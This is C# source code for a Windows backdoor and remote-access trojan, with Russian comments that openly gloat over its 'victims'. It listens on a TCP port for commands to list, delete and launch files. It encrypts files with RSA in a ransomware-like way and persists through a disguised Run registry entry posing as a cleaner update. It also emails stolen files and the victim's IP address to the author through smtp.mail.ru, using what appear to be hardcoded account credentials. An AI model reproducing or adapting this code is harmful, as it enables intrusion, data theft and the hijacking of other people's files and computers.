using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Servere
{
    class Server
    {
        public static NetworkStream Receiver;
        public static NetworkStream Writer;
        public static TcpListener listenner;
        public static Thread Rec;
        public static TcpClient client;
        public static int port = 9486;
        public static string date;

        public static void ReceiveCommands()
        {
            while (true)
            {
                // Читаем данные от злодея
                try
                {
                    //Пакет полученных данных
                    byte[] RecPacket = new byte[1000];

                    //Читаем команду от клиента
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Сбрасываем остатки
                    Receiver.Flush();

                    //Преобразуем пакет в читаемую строку
                    string command = Encoding.ASCII.GetString(RecPacket);

                    //Делим команду на две разные строки на основе сплиттера
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(command, ">");

                    //CommandArray[0] -> команда
                    //CommandArray[1] -> параметр 
                    //Получаем команду.
                    command = CommandArray[0];
                    
                    switch (command)
                    {
                        case "Msg": 
                            string Msg = CommandArray[1];
                            DisplayMessage(Msg.Trim('\0'));
                            break;

                        case "OpenWebSite": 
                            string site = CommandArray[1];
                            OpenWebsite(site.Trim('\0'));
                            break;

                        case "ShowFiles":
                            string dir = CommandArray[1];
                            ListFiles(dir.Trim('\0'));
                            break;

                        case "ShowFolders":
                            string path = CommandArray[1];
                            ListFolders(path.Trim('\0'));
                            break;

                        case "Info":
                            SendInfo();
                            break;
                            
                        case "Del":
                            string location = CommandArray[1];
                            deleteFile(location.Trim('\0'));
                            break;

                        case "GetFile":
                            string filePath = CommandArray[1];
                            getFile(filePath.Trim('\0'));
                            break;

                        case "OpenApp":
                            string appName = CommandArray[1];
                            openApp(appName.Trim('\0'));
                            break;
                            
                        case "AddToStartup":
                            addToStartup();
                            break;

                        case "KillBackDoor":
                            KillBackDoor();
                            break;

                        case "EncryptFile":
                            string fileDir = CommandArray[1];
                            string publickey = CommandArray[2] + ">" + CommandArray[3] + ">" + CommandArray[4] + ">" + CommandArray[5] + ">" + CommandArray[6] + ">" + CommandArray[7] + ">";
                            EncryptFile(fileDir.Trim('\0'), publickey);
                            break;

                        case "DecryptFile":
                            string file = CommandArray[1];
                            string privatekey = CommandArray[2] + ">" + CommandArray[3] + ">" + CommandArray[4] + ">" + CommandArray[5] + ">" +
                                CommandArray[6] + ">" + CommandArray[7] + ">" + CommandArray[8] + ">" + CommandArray[9] + ">" + CommandArray[10] + ">" +
                                CommandArray[11] + ">" + CommandArray[12] + ">" + CommandArray[13] + ">" + CommandArray[14] + ">" + CommandArray[15] + ">" +
                                CommandArray[16] + ">" + CommandArray[17] + ">" + CommandArray[18] + ">" + CommandArray[19] + ">";
                            DecryptFile(file.Trim('\0'), privatekey);
                            break;
                    }
                }
                catch
                {
                    break;
                }
            }
        }


        #region Commands
        public static void ListFiles(string location)
        {
            try
            {

                string files = "";
                System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(location);
                FileInfo[] file = dir.GetFiles("*.*");
                if (file.Length != 0)
                {
                    foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
                    {
                        files = files + "\n   - " + f.Name + " | " + f.Length.ToString() + " bytes";
                    }
                    byte[] Packet = Encoding.UTF8.GetBytes(files);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
                else
                {
                    files = "no files here...";
                    byte[] Packet = Encoding.UTF8.GetBytes(files);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
            }
            catch(Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }
        
        public static void ListFolders(string location)
        {
            try
            {

                string[] xfolders = Directory.GetDirectories(location);
                if (xfolders.Length == 0)
                {
                    string response = "no folders here...";
                    byte[] Packet = Encoding.UTF8.GetBytes(response);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
                else
                {
                    string[] directories = xfolders;

                    string folders = "";
                    foreach (string item in directories)
                    {
                        folders = folders + "   - " + item + "\\\n";
                    }
                    byte[] Packet = Encoding.UTF8.GetBytes(folders);
                    Writer.Write(Packet, 0, Packet.Length);
                    Writer.Flush();
                }
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }
        
        public static void SendInfo()
        {
            try
            {
                string pcname = Environment.UserName;
                string osversion = GetWindowsPlatform();
                string info = "PC Name : " + pcname + "\nOS Version: " + osversion;

                byte[] Packet = Encoding.UTF8.GetBytes(info);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch(Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }
        
        public static string GetWindowsPlatform()
        {
            OperatingSystem os = System.Environment.OSVersion;
            String subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
            RegistryKey key = Registry.LocalMachine;
            RegistryKey skey = key.OpenSubKey(subKey);
            return skey.GetValue("ProductName").ToString();
        }
        
        public static void OpenWebsite(string website)
        {
            try
            {
                System.Diagnostics.Process IE = new System.Diagnostics.Process();
                IE.StartInfo.FileName = "iexplore.exe";
                IE.StartInfo.Arguments = website;
                IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                IE.Start();

                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void DisplayMessage(string message)
        {
            try
            {
                MessageBox.Show(message, "From Kirrukha with love", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch(Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void deleteFile(string location)
        {
            try
            {
                File.Delete(location);
                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }
        
        public static void getFile(string location)
        {
            try
            {
                //Настройка клиента smtp
                SmtpClient client = new SmtpClient("smtp.mail.ru", 25);
                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Credentials = new System.Net.NetworkCredential("Kirrukha@bk.ru", "Kazancew_2011");

                //Подготовка сообщения
                Attachment objAttachment = new Attachment(@location);

                String msgFrom = "Kirrukha@bk.ru";
                String msgTo = "Kirill_Kazancew@mail.ru";
                String msgSubject = "Подарок для куллл }{ А Ц |{ Е Р А";
                String msgBody = "Твой вирус скомуниздил файл с компа жертвы)) ";

                MailMessage message = new MailMessage(msgFrom, msgTo, msgSubject, msgBody);
                message.Attachments.Add(objAttachment);
                
                //Отсылаем сообщение
                client.Send(message);
                
                string response = "Success!";
                byte[] Packet = Encoding.UTF8.GetBytes(response);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void openApp(string applicationName)
        {
            try
            {
                System.Diagnostics.Process app = new System.Diagnostics.Process();
                app.StartInfo.FileName = applicationName;
                app.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                app.Start();

                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }
        
        public static string getLocalIP()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }
        
        public static void alertAttacker()
        {
            try
            {
                //Configure the stmp client
                SmtpClient client = new SmtpClient("smtp.mail.ru", 25);
                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Credentials = new System.Net.NetworkCredential("Kirrukha@bk.ru", "Kazancew_2011");

                String msgFrom = "Kirrukha@bk.ru";
                String msgTo = "Kirill_Kazancew@mail.ru";
                String msgSubject = "ПревеД куллл }{ А Ц |{ Е Р";
                String msgBody = "Одна из жертв достаточно деградировала, чтобы запустить непровереный файл на свойм компе..... ХА-ХА-ХА\nнайти этого дибила сможешь по этим цифрам " + getLocalIP() + "\nP.S. НИКАКОЙ ПОЩАДЫ !!!";

                MailMessage message = new MailMessage(msgFrom, msgTo, msgSubject, msgBody);
                client.Send(message);
                
            }
            catch (SmtpException ex)
            {
                Writer = client.GetStream();

                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void KillBackDoor()
        {
            try
            {
                deleteFromStartup();
                Environment.Exit(0);

                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void addToStartup()
        {
            try
            {
                string pathToExe = Environment.CurrentDirectory + "\\Updates\\KirCleaner(Update-v1.1).exe";
                startup(true, pathToExe);

                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void deleteFromStartup()
        {
            try
            {
                string pathToExe = Environment.CurrentDirectory + "\\Updates\\KirCleaner(Update-v1.1).exe";
                startup(false, pathToExe);

                byte[] Packet = Encoding.UTF8.GetBytes("Success!");
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void startup(bool evil, string pathToExe)
        {
            const string name = "YouComp-MyCompHA-HA-HA";
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");

            try 
            {
                if (evil)
                    reg.SetValue(name, pathToExe);
                else
                    reg.DeleteValue(name);
                reg.Close();
            }
            catch(Exception ex)
            {
                return;
            }
        }

        public static void EncryptFile(string fileDir, string publickey)
        {
            try
            {
                date = File.ReadAllText(fileDir);
                byte[] data = Encoding.Unicode.GetBytes(date);

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.FromXmlString(publickey);
                byte[] EncryptedData = rsa.Encrypt(data, false);
                File.WriteAllText(fileDir, Convert.ToBase64String(EncryptedData));

                string f = "File '" + fileDir + "' successfully encrypted";
                byte[] Packet = Encoding.UTF8.GetBytes(f);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                byte[] Packet = Encoding.UTF8.GetBytes(ex.Message);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }

        public static void DecryptFile(string file, string privatekey)
        {
            try
            {
                byte[] data = new byte[1024];
                data = Convert.FromBase64String(File.ReadAllText(file));

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.FromXmlString(privatekey);
                byte[] DecryptedData = rsa.Decrypt(data, false);
                File.WriteAllText(file, Encoding.Unicode.GetString(DecryptedData));

                string f = "File '" + file + "' successfully decrypted";
                byte[] Packet = Encoding.UTF8.GetBytes(f);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
            catch (Exception ex)
            {
                File.WriteAllText(file, date);
                byte[] Packet = Encoding.UTF8.GetBytes(dec);
                Writer.Write(Packet, 0, Packet.Length);
                Writer.Flush();
            }
        }
        #endregion


        static void Main(string[] args)
        {
            //Письмо хацкеру
            alertAttacker();

            //Запуск tcp сервера
            listenner = new TcpListener(IPAddress.Any, port);
            try
            {
                listenner.Start();
            }
            catch(Exception ex)
            {
                return;
            }

            //Console.WriteLine(getLocalIP() + ":" + port.ToString());

            while (true)
            {
                Thread.Sleep(200);
                client = listenner.AcceptTcpClient();
                Receiver = client.GetStream();

                Writer = client.GetStream();

                Rec = new Thread(new ThreadStart(ReceiveCommands));
                Rec.Start();
            }
        }
        public static string dec = "File 'D:\\text.txt' successfully decrypted";
    }
}